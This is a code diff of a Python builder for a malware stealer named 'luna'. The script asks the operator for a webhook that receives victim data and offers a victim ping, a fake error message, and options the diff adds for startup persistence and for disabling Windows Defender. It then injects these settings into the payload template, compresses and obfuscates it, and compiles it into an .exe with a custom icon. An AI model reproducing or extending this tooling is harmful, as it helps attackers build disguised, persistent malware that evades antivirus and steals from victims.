@@ -1,16 +1,17 @@
 import os
-import requests
 import random
 import shutil
 import subprocess
-import time
 import sys
-
+import time
 from json import load
 from urllib.request import urlopen
+from zlib import compress
+
+import requests
 from alive_progress import alive_bar
 from colorama import Fore, Style, init
-from zlib import compress
+
 
 class Builder:
     def __init__(self) -> None:
@@ -19,26 +20,18 @@ class Builder:
         if not self.check():
             exit()
 
-        self.webhook = input(
-            f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Enter your webhook: ')
-            
+        self.webhook = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Enter your webhook: ')
         if not self.check_webhook(self.webhook):
-            print(
-                f"{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} {Fore.RED}Invalid Webhook!{Fore.RESET}")
-            str(input(
-                f"{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Press anything to exit..."))
+            print(f"{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} {Fore.RED}Invalid Webhook!{Fore.RESET}")
+            str(input(f"{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Press anything to exit..."))
             sys.exit()
 
-        self.filename = input(
-            f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Enter your filename: ')
-        self.ping = input(
-            f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Ping on new victim? (y/n): ')
+        self.filename = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Enter your filename: ')
 
+        self.ping = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Ping on new victim? (y/n): ')
         if self.ping.lower() == 'y':
             self.ping = True
-
-            self.pingtype = input(
-                f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Ping type? (here/everyone): ').lower()
+            self.pingtype = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Ping type? (here/everyone): ').lower()
             if self.pingtype not in ["here", "everyone"]:
                 # default to @here if invalid ping type.
                 self.pingtype == "here"
@@ -46,20 +39,28 @@ class Builder:
             self.ping = False
             self.pingtype = "none"
 
-        self.error = input(
-            f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Add a fake error? (y/n): ')
-
+        self.error = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Add a fake error? (y/n): ')
         if self.error.lower() == 'y':
             self.error = True
         else:
             self.error = False
 
-        self.obfuscation = input(
-            f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Do you want to obfuscate the file? (y/n): ')
+        self.startup = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Add file to startup? (y/n): ')
+        if self.startup.lower() == 'y':
+            self.startup = True
+        else:
+            self.startup = False
 
-        self.compy = input(
-            f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Do you want to compile the file to a .exe? (y/n): ')
-        
+        self.defender = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Disable windows defender? (y/n): ')
+        if self.defender.lower() == 'y':
+            self.defender = True
+        else:
+            self.defender = False
+
+        self.obfuscation = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Do you want to obfuscate the file? (y/n): ')
+
+        self.compy = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Do you want to compile the file to a .exe? (y/n): ')
+
         if self.compy == 'y':
             self.icon = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Do you want to add an icon to the .exe (y/n): ')
             if self.icon == 'y':
@@ -162,7 +163,7 @@ class Builder:
 
     def check(self):
         required_files = {'./luna.py',
-                          './requirements.txt', 
+                          './requirements.txt',
                           './obfuscation.py'}
 
         for file in required_files:
@@ -188,7 +189,7 @@ class Builder:
         os.system('mode con:cols=150 lines=20')
 
         return True
-    
+
     def icon_exe(self):
         self.icon_name = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Enter the name of the icon: ')
 
@@ -203,7 +204,7 @@ class Builder:
         else:
             print(f'{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET}Icon must have .ico extension! Please convert it and try again.')
             input(f"{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Press anything to exit...")
-    
+
     def renamefile(self, filename):
         try:
             os.rename(f"./obfuscated_compressed_{filename}.py", f"./{filename}.py")
@@ -221,7 +222,6 @@ class Builder:
             os.rename(f"./obfuscated_compressed_{filename}.exe", f"./{filename}.exe")
         except Exception:
             pass
-        
 
     def mk_file(self, filename, webhook):
         print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET} {Fore.WHITE}Generating source code...{Fore.RESET}')
@@ -231,10 +231,11 @@ class Builder:
 
         with open(f"{filename}.py", "w", encoding="utf-8") as f:
             f.write(code.replace('%webhook_here%', webhook)
-            .replace("\"%ping_enabled%\"", str(self.ping))
-            .replace("%ping_type%", self.pingtype)
-            .replace("\"%_error_enabled%\"", str(self.error))
-            .replace("\"%_hide_enabled%\"", str(self.error)))
+                    .replace("\"%ping_enabled%\"", str(self.ping))
+                    .replace("%ping_type%", self.pingtype)
+                    .replace("\"%_error_enabled%\"", str(self.error))
+                    .replace("\"%_startup_enabled%\"", str(self.startup))
+                    .replace("\"%_defender_enabled%\"", str(self.defender)))
 
         time.sleep(2)
         print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Source code has been generated...{Fore.RESET}')
@@ -270,7 +271,7 @@ class Builder:
         return f"eval(compile(__import__('zlib').decompress({compressed_code}),filename='auoiwhgoawhg',mode='exec'))"
 
     def encryption(self, filename):
-        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Obfuscating code...{Fore.RESET}')        
+        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Obfuscating code...{Fore.RESET}')
         os.system(f"python obfuscation.py {filename}.py")
 
     def compile(self, filename):
@@ -289,7 +290,7 @@ class Builder:
             os.system(f'start ./{filename}.exe')
         elif os.path.isfile(f'./{filename}.py'):
             os.system(f'python ./{filename}.py')
-    
+
     def cleanup(self, filename):
         cleans_dir = {'./__pycache__', './build'}
         cleans_file = {f'./{filename}.py', f'./obfuscated_compressed_{filename}.py', f'./compressed_{filename}.py', f'./compressed_{filename}.spec'}
@@ -318,6 +319,7 @@ class Builder:
             except Exception:
                 pass
                 continue
+
 
 if __name__ == '__main__':
     init()
